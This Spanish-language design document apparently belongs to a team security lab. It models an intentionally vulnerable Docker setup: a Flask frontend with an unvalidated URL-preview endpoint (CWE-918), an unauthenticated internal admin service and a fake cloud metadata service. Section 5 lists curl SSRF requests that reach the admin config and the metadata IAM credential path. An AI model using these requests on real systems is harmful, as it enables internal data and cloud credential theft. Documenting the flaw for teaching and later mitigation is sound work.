# Modelado arquitectónico de la topología vulnerable (entregable P2)

> Diagrama y análisis construidos sobre `lab-environment/docker-compose.yml` (commit `03b49fb`).
> Debe mantenerse sincronizado con `docs/puertos-y-protocolos.md` y con lo que P3 ejecute en la guía de ataque.

## 1. Diagrama de arquitectura

```mermaid
flowchart LR
  subgraph HOST["HOST DEL LABORATORIO"]
    U["Usuario / atacante<br/>curl http://localhost:8080"]
  end

  subgraph PUB["public-net · bridge (con salida)"]
    F["frontend-service · Flask :5000<br/>IP internal-net: 172.28.0.10<br/>ÚNICO nodo en ambas redes<br/>GET /preview?url=... → requests.get(url)"]
  end

  subgraph INT["internal-net · bridge internal: true · 172.28.0.0/24 (sin salida)"]
    A["internal-admin-service · HTTP :5001<br/>172.28.0.20<br/>GET /admin/users · GET /admin/config<br/>Sin autenticación"]
    M["fake-metadata · HTTP :80<br/>172.28.0.30<br/>GET /latest/meta-data/...<br/>Credenciales AWS FICTICIAS"]
  end

  U -->|"1 · HTTP :8080 → :5000 (flujo legítimo)"| F
  F -->|"2 · SSRF: petición saliente controlada por url"| A
  F -->|"2 · SSRF: petición saliente controlada por url"| M
  A -->|"3 · JSON interno (reenviado por el frontend)"| F
  M -->|"3 · JSON de metadatos (reenviado por el frontend)"| F
  F -->|"4 · Respuesta HTTP al atacante"| U
```

**Nota de precisión:** la IP `172.28.0.10` corresponde a la interfaz de `frontend-service` en `internal-net`. En `public-net` el contenedor recibe una IP dinámica del pool de Docker; el acceso desde el host se realiza mediante la publicación de puertos `8080:5000`, no mediante esa IP. La directiva `expose` de los servicios internos no publica puertos en el host: solo documenta el puerto del contenedor dentro de la red.

## 2. Inventario de nodos, puertos y protocolos

| Nodo | Red(es) | IP | Puerto contenedor | Publicado al host | Protocolo | Funciones relevantes |
|---|---|---|---:|---|---|---|
| Usuario / atacante | Host | `127.0.0.1` | — | — | HTTP/1.1 sobre TCP | Emite peticiones a `localhost:8080` |
| `frontend-service` | `public-net` + `internal-net` | `172.28.0.10` (internal-net) | `5000` | **Sí**: `8080 → 5000` | HTTP/1.1 sobre TCP | `/health`, `/preview?url=`; cliente HTTP saliente (`requests`) |
| `internal-admin-service` | `internal-net` | `172.28.0.20` | `5001` | No (`expose`) | HTTP/1.1 sobre TCP | `/health`, `/admin/users`, `/admin/config` |
| `fake-metadata` | `internal-net` | `172.28.0.30` | `80` | No (`expose`) | HTTP/1.1 sobre TCP | `/latest/meta-data/...`, `/health` |

**Comunicación entre procesos (IPC):** no hay colas de mensajes, RPC ni sockets UNIX entre los servicios. **Toda comunicación es HTTP sin TLS**; el único mecanismo de acoplamiento es `requests.get()` desde el frontend. Los *healthchecks* usan `urllib.request.urlopen()` contra `localhost` dentro de cada contenedor (bucle local, no atraviesa las redes). El arranque está ordenado por `depends_on` con condición `service_healthy`.

**Superficie expuesta:** un único puerto (`8080/TCP`) en el host. Los puertos `5001` y `80` solo son alcanzables desde contenedores conectados a `internal-net`. La red interna tiene `internal: true`, por lo que no ofrece salida a Internet ni ruta desde el host.

## 3. Secuencia del flujo abusado

```mermaid
sequenceDiagram
  actor Atacante
  participant FE as frontend-service
  participant AD as internal-admin-service
  participant MD as fake-metadata

  Atacante->>FE: GET /preview?url=http://172.28.0.20:5001/admin/config
  Note over FE: Sin validación de url (CWE-918)
  FE->>AD: GET /admin/config (desde 172.28.0.10)
  Note over AD: Confía en la IP de internal-net, sin authn/authz
  AD-->>FE: 200 OK · JSON con secretos ficticios
  FE-->>Atacante: 200 OK · cuerpo reenviado

  Atacante->>FE: GET /preview?url=http://172.28.0.30/latest/meta-data/iam/security-credentials/lab-ec2-role
  FE->>MD: GET .../lab-ec2-role
  MD-->>FE: 200 OK · credenciales AWS falsas
  FE-->>Atacante: 200 OK · cuerpo reenviado
```

## 4. Punto ciego de confianza entre `frontend-service` e `internal-admin-service`

| Capa | Lo que se asume | Lo que ocurre realmente |
|---|---|---|
| Red | `internal-net` es privada; sus miembros son de confianza | Cualquier código que corra en el frontend puede hablar con ella; el atacante controla la petición que ese código emite |
| Aplicación | `/preview` solo obtiene recursos «externos» | La URL del usuario se pasa tal cual a `requests.get()`; no hay allowlist ni comprobación de IP resuelta |
| Servicio interno | Las peticiones internas están autenticadas por su origen | `internal-admin-service` solo registra `request.remote_addr`; no verifica token, mTLS ni identidad |
| Respuesta | El frontend devuelve contenido inocuo | El cuerpo del servicio interno se reenvía al cliente, haciendo visible el dato sensible |

Consecuencia: la frontera de confianza se cruza **dentro** del frontend, no en el límite de la red. El atacante no necesita estar en `internal-net`: le basta con que el único nodo con pie en ambas redes actúe por él. Este es el punto que el diagrama debe resaltar para P3 y el que P4 debe cerrar.

## 5. Coordinación con P3 (contrato del diagrama con la guía de ataque)

La guía de explotación debe usar **exactamente** estos nodos, direcciones y rutas para que el diagrama siga siendo válido:

| # | Petición desde el host | Resultado esperado |
|---|---|---|
| 1 | `curl http://localhost:8080/health` | `{"status":"ok"}` — comprueba que el único puerto público responde |
| 2 | `curl http://localhost:5001/health` | Fallo de conexión — el servicio interno no está publicado |
| 3 | `curl "http://localhost:8080/preview?url=http://172.28.0.20:5001/admin/users"` | JSON con los tres usuarios ficticios |
| 4 | `curl "http://localhost:8080/preview?url=http://172.28.0.20:5001/admin/config"` | JSON con `db_password` y `api_key` **ficticios** |
| 5 | `curl "http://localhost:8080/preview?url=http://172.28.0.30/latest/meta-data/"` | Lista de claves de metadatos simulados |
| 6 | `curl "http://localhost:8080/preview?url=http://172.28.0.30/latest/meta-data/iam/security-credentials/lab-ec2-role"` | JSON con `AccessKeyId`, `SecretAccessKey` y `Token` **falsos** |

**Reglas de sincronización:**

- Si P3 emplea otra representación del destino (nombre DNS, IP en otro formato o redirección), debe añadirse al diagrama y a la justificación como variante del mismo vector.
- Si P1 cambia la subnet, las IP o los puertos en `docker-compose.yml`, hay que actualizar este archivo, `docs/puertos-y-protocolos.md` y los comandos de P3 en la misma revision.
- Los valores `AKIAFAKEFAKEFAKEFAKE`, `FAKE/secret/access/key/for/lab/only` y `FAKE-SESSION-TOKEN-LAB-ONLY` son señuelos: deben identificarse como falsos en cualquier captura o evidencia que se publique.
- La mitigación (P4) debe reflejarse como una nueva capa en el diagrama final, sin borrar la topología vulnerable: la guía necesita mostrar el antes y el después.
